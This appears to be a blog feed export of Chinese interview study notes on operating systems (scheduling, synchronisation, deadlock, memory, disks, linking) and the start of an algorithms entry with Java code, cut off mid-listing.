调度：线程是独立调度的基本单位，在同一进程中，线程的切换不会引起进程切换，从一个进程内的线程切换到另一个进程中的线程时，会引起进程切换。 系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O 设备等，所付出的开销远大于创建或撤销线程时的开销。类似地，在进行进程切换时，涉及当前执行进程 CPU 环境的保存及新调度进程 CPU 环境的设置，而线程切换时只需保存和设置少量寄存器内容，开销很小。 通信方面：进程间通信 (IPC) 需要进程同步和互斥手段的辅助，以保证数据的一致性。而线程间可以通过直接读/写同一进程中的数据段（如全局变量）来进行通信。 举例：QQ 和浏览器是两个进程，浏览器进程里面有很多线程，例如 HTTP 请求线程、事件响应线程、渲染线程等等，线程的并发执行使得在浏览器中点击一个新链接从而发起 HTTP 请求时，浏览器还可以响应用户的其它事件。 进程状态的切换 就绪状态（ready）：等待被调度 运行状态（running） 阻塞状态（waiting）：等待资源 应该注意以下内容： 只有就绪态和运行态可以相互转换，其它的都是单向转换。就绪状态的进程通过调度算法从而获得 CPU 时间，转为运行状态；而运行状态的进程，在分配给它的 CPU 时间片用完之后就会转为就绪状态，等待下一次调度。 阻塞状态是缺少需要的资源从而由运行状态转换而来，但是该资源不包括 CPU 时间，缺少 CPU 时间会从运行态转换为就绪态。 进程调度算法不同环境的调度算法目标不同，因此需要针对不同环境来讨论调度算法。 1. 批处理系统批处理系统没有太多的用户操作，在该系统中，调度算法目标是保证吞吐量和周转时间（从提交到终止的时间）。 1.1 先来先服务 first-come first-serverd（FCFS） 按照请求的顺序进行调度。 有利于长作业，但不利于短作业，因为短作业必须一直等待前面的长作业执行完毕才能执行，而长作业又需要执行很长时间，造成了短作业等待时间过长。 1.2 短作业优先 shortest job first（SJF） 按估计运行时间最短的顺序进行调度。 长作业有可能会饿死，处于一直等待短作业执行完毕的状态。因为如果一直有短作业到来，那么长作业永远得不到调度。 1.3 最短剩余时间优先 shortest remaining time next（SRTN） 按估计剩余时间最短的顺序进行调度。 2. 交互式系统交互式系统有大量的用户交互操作，在该系统中调度算法的目标是快速地进行响应。 2.1 时间片轮转 将所有就绪进程按 FCFS 的原则排成一个队列，每次调度时，把 CPU 时间分配给队首进程，该进程可以执行一个时间片。当时间片用完时，由计时器发出时钟中断，调度程序便停止该进程的执行，并将它送往就绪队列的末尾，同时继续把 CPU 时间分配给队首的进程。 时间片轮转算法的效率和时间片的大小有很大关系。因为进程切换都要保存进程的信息并且载入新进程的信息，如果时间片太小，会导致进程切换得太频繁，在进程切换上就会花过多时间。 2.2 优先级调度 为每个进程分配一个优先级，按优先级进行调度。 为了防止低优先级的进程永远等不到调度，可以随着时间的推移增加等待进程的优先级。 2.3 多级反馈队列 如果一个进程需要执行 100 个时间片，如果采用时间片轮转调度算法，那么需要交换 100 次。 多级队列是为这种需要连续执行多个时间片的进程考虑，它设置了多个队列，每个队列时间片大小都不同，例如 1,2,4,8,..。进程在第一个队列没执行完，就会被移到下一个队列。这种方式下，之前的进程只需要交换 7 次。 每个队列优先权也不同，最上面的优先权最高。因此只有上一个队列没有进程在排队，才能调度当前队列上的进程。 可以将这种调度算法看成是时间片轮转调度算法和优先级调度算法的结合。 3. 实时系统实时系统要求一个请求在一个确定时间内得到响应。 分为硬实时和软实时，前者必须满足绝对的截止时间，后者可以容忍一定的超时。 进程同步1. 临界区对临界资源进行访问的那段代码称为临界区。 为了互斥访问临界资源，每个进程在进入临界区之前，需要先进行检查。 123// entry section// critical section;// exit section 2. 同步与互斥 同步：多个进程按一定顺序执行； 互斥：多个进程在同一时刻只有一个进程能进入临界区。 3. 信号量信号量（Semaphore）是一个整型变量，可以对其执行 down 和 up 操作，也就是常见的 P 和 V 操作。 down : 如果信号量大于 0 ，执行 -1 操作；如果信号量等于 0，进程睡眠，等待信号量大于 0； up ：对信号量执行 +1 操作，唤醒睡眠的进程让其完成 down 操作。 down 和 up 操作需要被设计成原语，不可分割，通常的做法是在执行这些操作的时候屏蔽中断。 如果信号量的取值只能为 0 或者 1，那么就成为了 互斥量（Mutex） ，0 表示临界区已经加锁，1 表示临界区解锁。 12345678910111213typedef int semaphore;semaphore mutex = 1;void P1() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125;void P2() &#123; down(&amp;mutex); // 临界区 up(&amp;mutex);&#125; 使用信号量实现生产者-消费者问题 问题描述：使用一个缓冲区来保存物品，只有缓冲区没有满，生产者才可以放入物品；只有缓冲区不为空，消费者才可以拿走物品。 因为缓冲区属于临界资源，因此需要使用一个互斥量 mutex 来控制对缓冲区的互斥访问。 为了同步生产者和消费者的行为，需要记录缓冲区中物品的数量。数量可以使用信号量来进行统计，这里需要使用两个信号量：empty 记录空缓冲区的数量，full 记录满缓冲区的数量。其中，empty 信号量是在生产者进程中使用，当 empty 不为 0 时，生产者才可以放入物品；full 信号量是在消费者进程中使用，当 full 信号量不为 0 时，消费者才可以取走物品。 注意，不能先对缓冲区进行加锁，再测试信号量。也就是说，不能先执行 down(mutex) 再执行 down(empty)。如果这么做了，那么可能会出现这种情况：生产者对缓冲区加锁后，执行 down(empty) 操作，发现 empty = 0，此时生产者睡眠。消费者不能进入临界区，因为生产者对缓冲区加锁了，也就无法执行 up(empty) 操作，empty 永远都为 0，那么生产者和消费者就会一直等待下去，造成死锁。 123456789101112131415161718192021222324252627#define N 100typedef int semaphore;semaphore mutex = 1;semaphore empty = N;semaphore full = 0;void producer() &#123; while(TRUE)&#123; int item = produce_item(); down(&amp;empty); down(&amp;mutex); insert_item(item); up(&amp;mutex); up(&amp;full); &#125;&#125;void consumer() &#123; while(TRUE)&#123; down(&amp;full); down(&amp;mutex); int item = remove_item(); up(&amp;mutex); up(&amp;empty); consume_item(item); &#125;&#125; 4. 管程使用信号量机制实现的生产者消费者问题需要客户端代码做很多控制，而管程把控制的代码独立出来，不仅不容易出错，也使得客户端代码调用更容易。 c 语言不支持管程，下面的示例代码使用了类 Pascal 语言来描述管程。示例代码的管程提供了 insert() 和 remove() 方法，客户端代码通过调用这两个方法来解决生产者-消费者问题。 1234567891011121314monitor ProducerConsumer integer i; condition c; procedure insert(); begin // ... end; procedure remove(); begin // ... end;end monitor; 管程有一个重要特性：在一个时刻只能有一个进程使用管程。进程在无法继续执行的时候不能一直占用管程，否者其它进程永远不能使用管程。 管程引入了 条件变量 以及相关的操作：wait() 和 signal() 来实现同步操作。对条件变量执行 wait() 操作会导致调用进程阻塞，把管程让出来给另一个进程持有。signal() 操作用于唤醒被阻塞的进程。 使用管程实现生成者-消费者问题 123456789101112131415161718192021222324252627282930313233343536373839404142// 管程monitor ProducerConsumer condition full, empty; integer count := 0; condition c; procedure insert(item: integer); begin if count = N then wait(full); insert_item(item); count := count + 1; if count = 1 then signal(empty); end; function remove: integer; begin if count = 0 then wait(empty); remove = remove_item; count := count - 1; if count = N -1 then signal(full); end;end monitor;// 生产者客户端procedure producerbegin while true do begin item = produce_item; ProducerConsumer.insert(item); endend;// 消费者客户端procedure consumerbegin while true do begin item = ProducerConsumer.remove; consume_item(item); endend; 经典同步问题生产者和消费者问题前面已经讨论过了。 1. 读者-写者问题允许多个进程同时对数据进行读操作，但是不允许读和写以及写和写操作同时发生。 一个整型变量 count 记录在对数据进行读操作的进程数量，一个互斥量 count_mutex 用于对 count 加锁，一个互斥量 data_mutex 用于对读写的数据加锁。 1234567891011121314151617181920212223242526typedef int semaphore;semaphore count_mutex = 1;semaphore data_mutex = 1;int count = 0;void reader() &#123; while(TRUE) &#123; down(&amp;count_mutex); count++; if(count == 1) down(&amp;data_mutex); // 第一个读者需要对数据进行加锁，防止写进程访问 up(&amp;count_mutex); read(); down(&amp;count_mutex); count--; if(count == 0) up(&amp;data_mutex); up(&amp;count_mutex); &#125;&#125;void writer() &#123; while(TRUE) &#123; down(&amp;data_mutex); write(); up(&amp;data_mutex); &#125;&#125; 2. 哲学家进餐问题 五个哲学家围着一张圆桌，每个哲学家面前放着食物。哲学家的生活有两种交替活动：吃饭以及思考。当一个哲学家吃饭时，需要先拿起自己左右两边的两根筷子，并且一次只能拿起一根筷子。 下面是一种错误的解法，考虑到如果所有哲学家同时拿起左手边的筷子，那么就无法拿起右手边的筷子，造成死锁。 123456789101112#define N 5void philosopher(int i) &#123; while(TRUE) &#123; think(); take(i); // 拿起左边的筷子 take((i+1)%N); // 拿起右边的筷子 eat(); put(i); put((i+1)%N); &#125;&#125; 为了防止死锁的发生，可以设置两个条件： 必须同时拿起左右两根筷子； 只有在两个邻居都没有进餐的情况下才允许进餐。 123456789101112131415161718192021222324252627282930313233343536373839404142#define N 5#define LEFT (i + N - 1) % N // 左邻居#define RIGHT (i + 1) % N // 右邻居#define THINKING 0#define HUNGRY 1#define EATING 2typedef int semaphore;int state[N]; // 跟踪每个哲学家的状态semaphore mutex = 1; // 临界区的互斥semaphore s[N]; // 每个哲学家一个信号量void philosopher(int i) &#123; while(TRUE) &#123; think(); take_two(i); eat(); put_tow(i); &#125;&#125;void take_two(int i) &#123; down(&amp;mutex); state[i] = HUNGRY; test(i); up(&amp;mutex); down(&amp;s[i]);&#125;void put_tow(i) &#123; down(&amp;mutex); state[i] = THINKING; test(LEFT); test(RIGHT); up(&amp;mutex);&#125;void test(i) &#123; // 尝试拿起两把筷子 if(state[i] == HUNGRY &amp;&amp; state[LEFT] != EATING &amp;&amp; state[RIGHT] !=EATING) &#123; state[i] = EATING; up(&amp;s[i]); &#125;&#125; 进程通信进程同步与进程通信很容易混淆，它们的区别在于： 进程同步：控制多个进程按一定顺序执行； 进程通信：进程间传输信息。 进程通信是一种手段，而进程同步是一种目的。也可以说，为了能够达到进程同步的目的，需要让进程进行通信，传输一些进程同步所需要的信息。 1. 管道管道是通过调用 pipe 函数创建的，fd[0] 用于读，fd[1] 用于写。 12#include &lt;unistd.h&gt;int pipe(int fd[2]); 它具有以下限制： 只支持半双工通信（单向传输）； 只能在父子进程中使用。 2. FIFO也称为命名管道，去除了管道只能在父子进程中使用的限制。 123#include &lt;sys/stat.h&gt;int mkfifo(const char *path, mode_t mode);int mkfifoat(int fd, const char *path, mode_t mode); FIFO 常用于客户-服务器应用程序中，FIFO 用作汇聚点，在客户进程和服务器进程之间传递数据。 3. 消息队列相比于 FIFO，消息队列具有以下优点： 消息队列可以独立于读写进程存在，从而避免了 FIFO 中同步管道的打开和关闭时可能产生的困难； 避免了 FIFO 的同步阻塞问题，不需要进程自己提供同步方法； 读进程可以根据消息类型有选择地接收消息，而不像 FIFO 那样只能默认地接收。 4. 信号量它是一个计数器，用于为多个进程提供对共享数据对象的访问。 5. 共享存储允许多个进程共享一个给定的存储区。因为数据不需要在进程之间复制，所以这是最快的一种 IPC。 需要使用信号量用来同步对共享存储的访问。 多个进程可以将同一个文件映射到它们的地址空间从而实现共享内存。另外 XSI 共享内存不是使用文件，而是使用使用内存的匿名段。 6. 套接字与其它通信机制不同的是，它可用于不同机器间的进程通信。 三、死锁死锁的必要条件 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。 死锁的处理方法1. 鸵鸟策略把头埋在沙子里，假装根本没发生问题。 因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。 大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。 2. 死锁检测与死锁恢复不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。 （一）每种类型一个资源的死锁检测 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。 图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。 每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。 （二）每种类型多个资源的死锁检测 上图中，有三个进程四个资源，每个数据代表的含义如下： E 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量 进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。 算法总结如下： 每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。 （三）死锁恢复 利用抢占恢复 利用回滚恢复 通过杀死进程恢复 3. 死锁预防在程序运行之前预防发生死锁。 （一）破坏互斥条件 例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。 （二）破坏占有和等待条件 一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。 （三）破坏不可抢占条件 （四）破坏环路等待 给资源统一编号，进程只能按编号顺序来请求资源。 4. 死锁避免在程序运行时避免发生死锁。 （一）安全状态 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。 定义：如果没有死锁发生，并且即使所有进程突然请求对资源的最大需求，也仍然存在某种调度次序能够使得每一个进程运行完毕，则称该状态是安全的。 安全状态的检测与死锁的检测类似，因为安全状态必须要求不能发生死锁。下面的银行家算法与死锁检测算法非常类似，可以结合着做参考对比。 （二）单个资源的银行家算法 一个小城镇的银行家，他向一群客户分别承诺了一定的贷款额度，算法要做的是判断对请求的满足是否会进入不安全状态，如果是，就拒绝请求；否则予以分配。 上图 c 为不安全状态，因此算法会拒绝之前的请求，从而避免进入图 c 中的状态。 （三）多个资源的银行家算法 上图中有五个进程，四个资源。左边的图表示已经分配的资源，右边的图表示还需要分配的资源。最右边的 E、P 以及 A 分别表示：总资源、已分配资源以及可用资源，注意这三个为向量，而不是具体数值，例如 A=(1020)，表示 4 个资源分别还剩下 1/0/2/0。 检查一个状态是否安全的算法如下： 查找右边的矩阵是否存在一行小于等于向量 A。如果不存在这样的行，那么系统将会发生死锁，状态是不安全的。 假若找到这样一行，将该进程标记为终止，并将其已分配资源加到 A 中。 重复以上两步，直到所有进程都标记为终止，则状态时安全的。 如果一个状态不是安全的，需要拒绝进入这个状态。 四、内存管理虚拟内存虚拟内存的目的是为了让物理内存扩充成更大的逻辑内存，从而让程序获得更多的可用内存。 为了更好的管理内存，操作系统将内存抽象成地址空间。每个程序拥有自己的地址空间，这个地址空间被分割成多个块，每一块称为一页。这些页被映射到物理内存，但不需要映射到连续的物理内存，也不需要所有页都必须在物理内存中。当程序引用到一部分不在物理内存中的地址空间时，由硬件执行必要的映射，将缺失的部分装入物理内存并重新执行失败的指令。 从上面的描述中可以看出，虚拟内存允许程序不用将地址空间中的每一页都映射到物理内存，也就是说一个程序不需要全部调入内存就可以运行，这使得有限的内存运行大程序称为可能。例如有一台计算机可以产生 16 位地址，那么一个程序的地址空间范围是 0~64K。该计算机只有 32KB 的物理内存，虚拟内存技术允许该计算机运行一个 64K 大小的程序。 分页系统地址映射 内存管理单元（MMU）：管理着地址空间和物理内存的转换。 页表（Page table）：页（地址空间）和页框（物理内存空间）的映射表。例如下图中，页表的第 0 个表项为 010，表示第 0 个页映射到第 2 个页框。页表项的最后一位用来标记页是否在内存中。 下图的页表存放着 16 个页，这 16 个页需要用 4 个比特位来进行索引定位。因此对于虚拟地址（0010 000000000100），前 4 位是用来存储页面号，而后 12 位存储在页中的偏移量。 （0010 000000000100）根据前 4 位得到页号为 2，读取表项内容为（110 1），它的前 3 为为页框号，最后 1 位表示该页在内存中。最后映射得到物理内存地址为（110 000000000100）。 页面置换算法在程序运行过程中，如果要访问的页面不在内存中，就发生缺页中断从而将该页调入内存中。此时如果内存已无空闲空间，系统必须从内存中调出一个页面到磁盘对换区中来腾出空间。 页面置换算法和缓存淘汰策略类似，可以将内存看成磁盘的缓存。在缓存系统中，缓存的大小有限，当有新的缓存到达时，需要淘汰一部分已经存在的缓存，这样才有空间存放新的缓存数据。 页面置换算法的主要目标是使页面置换频率最低（也可以说缺页率最低）。 1. 最佳 Optimal 所选择的被换出的页面将是最长时间内不再被访问，通常可以保证获得最低的缺页率。 是一种理论上的算法，因为无法知道一个页面多长时间不再被访问。 举例：一个系统为某进程分配了三个物理块，并有如下页面引用序列： 开始运行时，先将 7, 0, 1 三个页面装入内存。当进程要访问页面 2 时，产生缺页中断，会将页面 7 换出，因为页面 7 再次被访问的时间最长。 2. 最近最久未使用 LRU, Least Recently Used 虽然无法知道将来要使用的页面情况，但是可以知道过去使用页面的情况。LRU 将最近最久未使用的页面换出。 为了实现 LRU，需要在内存中维护一个所有页面的链表。当一个页面被访问时，将这个页面移到链表表头。这样就能保证链表表尾的页面时最近最久未访问的。 因为每次访问都需要更新链表，因此这种方式实现的 LRU 代价很高。 3. 最近未使用 NRU, Not Recently Used 每个页面都有两个状态位：R 与 M，当页面被访问时设置页面的 R=1，当页面被修改时设置 M=1。其中 R 位会定时被清零。可以将页面分成以下四类： R=0，M=0 R=0，M=1 R=1，M=0 R=1，M=1 当发生缺页中断时，NRU 算法随机地从类编号最小的非空类中挑选一个页面将它换出。 NRU 优先换出已经被修改的脏页面（R=0，M=1），而不是被频繁使用的干净页面（R=1，M=0）。 4. 先进先出 FIFO, First In First Out 选择换出的页面是最先进入的页面。 该算法会将那些经常被访问的页面也被换出，从而使缺页率升高。 5. 第二次机会算法FIFO 算法可能会把经常使用的页面置换出去，为了避免这一问题，对该算法做一个简单的修改： 当页面被访问 (读或写) 时设置该页面的 R 位为 1。需要替换的时候，检查最老页面的 R 位。如果 R 位是 0，那么这个页面既老又没有被使用，可以立刻置换掉；如果是 1，就将 R 位清 0，并把该页面放到链表的尾端，修改它的装入时间使它就像刚装入的一样，然后继续从链表的头部开始搜索。 6. 时钟 Clock 第二次机会算法需要在链表中移动页面，降低了效率。时钟算法使用环形链表将页面链接起来，再使用一个指针指向最老的页面。 分段虚拟内存采用的是分页技术，也就是将地址空间划分成固定大小的页，每一页再与内存进行映射。 下图为一个编译器在编译过程中建立的多个表，有 4 个表是动态增长的，如果使用分页系统的一维地址空间，动态增长的特点会导致覆盖问题的出现。 分段的做法是把每个表分成段，一个段构成一个独立的地址空间。每个段的长度可以不同，并且可以动态增长。 段页式程序的地址空间划分成多个拥有独立地址空间的段，每个段上的地址空间划分成大小相同的页。这样既拥有分段系统的共享和保护，又拥有分页系统的虚拟内存功能。 分页与分段的比较 对程序员的透明性：分页透明，但是分段需要程序员显示划分每个段。 地址空间的维度：分页是一维地址空间，分段是二维的。 大小是否可以改变：页的大小不可变，段的大小可以动态改变。 出现的原因：分页主要用于实现虚拟内存，从而获得更大的地址空间；分段主要是为了使程序和数据可以被划分为逻辑上独立的地址空间并且有助于共享和保护。 五、设备管理磁盘调度算法读写一个磁盘块的时间的影响因素有： 旋转时间（主轴旋转磁盘，使得磁头移动到适当的扇区上） 寻道时间（制动手臂移动，使得磁头移动到适当的磁道上） 实际的数据传输时间 其中，寻道时间最长，因此磁盘调度的主要目标是使磁盘的平均寻道时间最短。 1. 先来先服务 FCFS, First Come First Served 按照磁盘请求的顺序进行调度。 优点是公平和简单。缺点也很明显，因为未对寻道做任何优化，使平均寻道时间可能较长。 2. 最短寻道时间优先 SSTF, Shortest Seek Time First 优先调度与当前磁头所在磁道距离最近的磁道。 虽然平均寻道时间比较低，但是不够公平。如果新到达的磁道请求总是比一个在等待的磁道请求近，那么在等待的磁道请求会一直等待下去，也就是出现饥饿现象。具体来说，两边的磁道请求更容易出现饥饿现象。 3. 电梯算法 SCAN 电梯总是保持一个方向运行，直到该方向没有请求为止，然后改变运行方向。 电梯算法（扫描算法）和电梯的运行过程类似，总是按一个方向来进行磁盘调度，直到该方向上没有未完成的磁盘请求，然后改变方向。 因为考虑了移动方向，因此所有的磁盘请求都会被满足，解决了 SSTF 的饥饿问题。 六、链接编译系统以下是一个 hello.c 程序： 1234567#include &lt;stdio.h&gt;int main()&#123; printf("hello, world\n"); return 0;&#125; 在 Unix 系统上，由编译器把源文件转换为目标文件。 1gcc -o hello hello.c 这个过程大致如下： 预处理阶段：处理以 # 开头的预处理命令； 编译阶段：翻译成汇编文件； 汇编阶段：将汇编文件翻译成可重定向目标文件； 链接阶段：将可重定向目标文件和 printf.o 等单独预编译好的目标文件进行合并，得到最终的可执行目标文件。 静态链接静态连接器以一组可重定向目标文件为输入，生成一个完全链接的可执行目标文件作为输出。链接器主要完成以下两个任务： 符号解析：每个符号对应于一个函数、一个全局变量或一个静态变量，符号解析的目的是将每个符号引用与一个符号定义关联起来。 重定位：链接器通过把每个符号定义与一个内存位置关联起来，然后修改所有对这些符号的引用，使得它们指向这个内存位置。 目标文件 可执行目标文件：可以直接在内存中执行； 可重定向目标文件：可与其它可重定向目标文件在链接阶段合并，创建一个可执行目标文件； 共享目标文件：这是一种特殊的可重定向目标文件，可以在运行时被动态加载进内存并链接； 动态链接静态库有以下两个问题： 当静态库更新时那么整个程序都要重新进行链接； 对于 printf 这种标准函数库，如果每个程序都要有代码，这会极大浪费资源。 共享库是为了解决静态库的这两个问题而设计的，在 Linux 系统中通常用 .so 后缀来表示，Windows 系统上它们被称为 DLL。它具有以下特点： 在给定的文件系统中一个库只有一个文件，所有引用该库的可执行目标文件都共享这个文件，它不会被复制到引用它的可执行文件中； 在内存中，一个共享库的 .text 节（已编译程序的机器代码）的一个副本可以被不同的正在运行的进程共享。 参考资料 Tanenbaum A S, Bos H. Modern operating systems[M]. Prentice Hall Press, 2014. 汤子瀛, 哲凤屏, 汤小丹. 计算机操作系统[M]. 西安电子科技大学出版社, 2001. Bryant, R. E., &amp; O’Hallaron, D. R. (2004). 深入理解计算机系统. Operating System Notes 进程间的几种通信方式 Operating-System Structures Processes Inter Process Communication Presentation[1]]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[一、前言 二、算法分析 数学模型 ThreeSum 倍率实验 注意事项 三、栈和队列 栈 队列 四、并查集 quick-find quick-union 加权 quick-union 路径压缩的加权 quick-union 各种 union-find 算法的比较 五、排序 选择排序 冒泡排序 插入排序 希尔排序 归并排序 快速排序 堆排序 小结 六、查找 链表实现无序符号表 二分查找实现有序符号表 二叉查找树 2-3 查找树 红黑树 散列表 小结 七、其它 汉诺塔 哈夫曼编码 参考资料 一、前言本文实现代码以及测试代码放在 Algorithm 二、算法分析数学模型1. 近似N3/6-N2/2+N/3 \ N3/6。使用 \f(N) 来表示所有随着 N 的增大除以 f(N) 的结果趋近于 1 的函数。 2. 增长数量级N3/6-N2/2+N/3 的增长数量级为 O(N3)。增长数量级将算法与它的实现隔离开来，一个算法的增长数量级为 O(N3) 与它是否用 Java 实现，是否运行于特定计算机上无关。 3. 内循环执行最频繁的指令决定了程序执行的总时间，把这些指令称为程序的内循环。 4. 成本模型使用成本模型来评估算法，例如数组的访问次数就是一种成本模型。 ThreeSumThreeSum 用于统计一个数组中和为 0 的三元组数量。 123public interface ThreeSum &#123; int count(int[] nums);&#125; 12345678910111213public class ThreeSumSlow implements ThreeSum &#123; @Override public int count(int[] nums) &#123; int N = nums.length; int cnt = 0; for (int i = 0; i &lt; N; i++) for (int j = i + 1; j &lt; N; j++) for (int k = j + 1; k &lt; N; k++) if (nums[i] + nums[j] + nums[k] == 0) cnt++; return cnt; &#125;&#125; 该算法的内循环为 if (nums[i] + nums[j] + nums[k] == 0) 语句，总共执行的次数为 N(N-1)(N-2) = N3/6-N2/2+N/3，因此它的近似执行次数为 ~N3/6，增长数量级为 O(N3)。 改进 通过将数组先排序，对两个元素求和，并用二分查找方法查找是否存在该和的相反数，如果存在，就说明存在三元组的和为 0。 应该注意的是，只有数组不含有相同元素才能使用这种解法，否则二分查找的结果会出错。 该方法可以将 ThreeSum 算法增长数量级降低为 O(N2logN)。 12345678910111213141516public class ThreeSumFast &#123; public static int count(int[] nums) &#123; Arrays.sort(nums); int N = nums.length; int cnt = 0; for (int i = 0; i &lt; N; i++) for (int j = i + 1; j &lt; N; j++) &#123; int target = -nums[i] - nums[j]; int index = BinarySearch.search(nums, target); // 应该注意这里的下标必须大于 j，否则会重复统计。 if (index &gt; j) cnt++; &#125; return cnt; &#125;&#125; 123456789101112131415public class BinarySearch &#123; public static int search(int[] nums, int target) &#123; int l = 0, h = nums.length - 1; while (l &lt;= h) &#123; int m = l + (h - l) / 2; if (target == nums[m]) return m; else if (target &gt; nums[m]) l = m + 1; else h = m - 1; &#125; return -1; &#125;&#125; 倍率实验如果 T(N) \ aNblogN，那么 T(2N)/T(N) \ 2b。 例如对于暴力的 ThreeSum 算法，近似时间为 ~N3/6。进行如下实验：多次运行该算法，每次取的 N 值为前一次的两倍，统计每次执行的时间，并统计本次运行时间与前一次运行时间的比值，得到如下结果： N Time(ms) Ratio 500 48 / 1000 320 6.7 2000 555 1.7 4000 4105 7.4 8000 33575 8.2 16000 268909 8.0 可以看到，T(2N)/T(N) \ 23，因此可以确定 T(N) \ aN3logN。 12345678910111213141516171819public class RatioTest &#123; public static void main(String[] args) &#123; int N = 500; int loopTimes = 7; double preTime = -1; while (loopTimes-- &gt; 0) &#123; int[] nums = new int[N]; StopWatch.start(); ThreeSum threeSum = new ThreeSumSlow(); int cnt = threeSum.count(nums); System.out.println(cnt); double elapsedTime = StopWatch.elapsedTime(); double ratio = preTime == -1 ? 0 : elapsedTime / preTime; System.out.println(N + " " + elapsedTime + " " + ratio); preTime = elapsedTime; N *= 2; &#125; &#125;&#125; 123456789101112public class StopWatch &#123; private static long start; public static void start()&#123; start = System.currentTimeMillis(); &#125; public static double elapsedTime() &#123; long now = System.currentTimeMillis(); return (now - start) / 1000.0; &#125;&#125; 注意事项1. 大常数在求近似时，如果低级项的常数系数很大，那么近似的结果就是错误的。 2. 缓存计算机系统会使用缓存技术来组织内存，访问数组相邻的元素会比访问不相邻的元素快很多。 3. 对最坏情况下的性能的保证在核反应堆、心脏起搏器或者刹车控制器中的软件，最坏情况下的性能是十分重要的。 4. 随机化算法通过打乱输入，去除算法对输入的依赖。 5. 均摊分析将所有操作的总成本除于操作总数来将成本均摊。例如对一个空栈进行 N 次连续的 push() 调用需要访问数组的元素为 N+4+8+16+…+2N=5N-4（N 是向数组写入元素，其余的都是调整数组大小时进行复制需要的访问数组操作），均摊后每次操作访问数组的平均次数为常数。 三、栈和队列栈First-In-Last-Out 123456789public interface MyStack&lt;Item&gt; extends Iterable&lt;Item&gt; &#123; MyStack&lt;Item&gt; push(Item item); Item pop() throws Exception; boolean isEmpty(); int size();&#125; 1. 数组实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869public class ArrayStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; // 栈元素数组，只能通过转型来创建泛型数组 private Item[] a = (Item[]) new Object[1]; // 元素数量 private int N = 0; @Override public MyStack&lt;Item&gt; push(Item item) &#123; check(); a[N++] = item; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = a[--N]; check(); a[N] = null; // 避免对象游离 return item; &#125; private void check() &#123; if (N &gt;= a.length) resize(2 * a.length); else if (N &gt; 0 &amp;&amp; N &lt;= a.length / 4) resize(a.length / 2); &#125; /** * 调整数组大小，使得栈具有伸缩性 */ private void resize(int size) &#123; Item[] tmp = (Item[]) new Object[size]; for (int i = 0; i &lt; N; i++) tmp[i] = a[i]; a = tmp; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; // 返回逆序遍历的迭代器 return new Iterator&lt;Item&gt;() &#123; private int i = N; @Override public boolean hasNext() &#123; return i &gt; 0; &#125; @Override public Item next() &#123; return a[--i]; &#125; &#125;; &#125;&#125; 2. 链表实现需要使用链表的头插法来实现，因为头插法中最后压入栈的元素在链表的开头，它的 next 指针指向前一个压入栈的元素，在弹出元素时就可以通过 next 指针遍历到前一个压入栈的元素从而让这个元素称为新的栈顶元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class ListStack&lt;Item&gt; implements MyStack&lt;Item&gt; &#123; private Node top = null; private int N = 0; private class Node &#123; Item item; Node next; &#125; @Override public MyStack&lt;Item&gt; push(Item item) &#123; Node newTop = new Node(); newTop.item = item; newTop.next = top; top = newTop; N++; return this; &#125; @Override public Item pop() throws Exception &#123; if (isEmpty()) throw new Exception("stack is empty"); Item item = top.item; top = top.next; N--; return item; &#125; @Override public boolean isEmpty() &#123; return N == 0; &#125; @Override public int size() &#123; return N; &#125; @Override public Iterator&lt;Item&gt; iterator() &#123; return new Iterator&lt;Item&gt;() &#123; private Node cur = top; @Override public boolean hasNext() &#123; return cur != null; &#125; @Override public Item next() &#123; Item item = cur.item; cur = 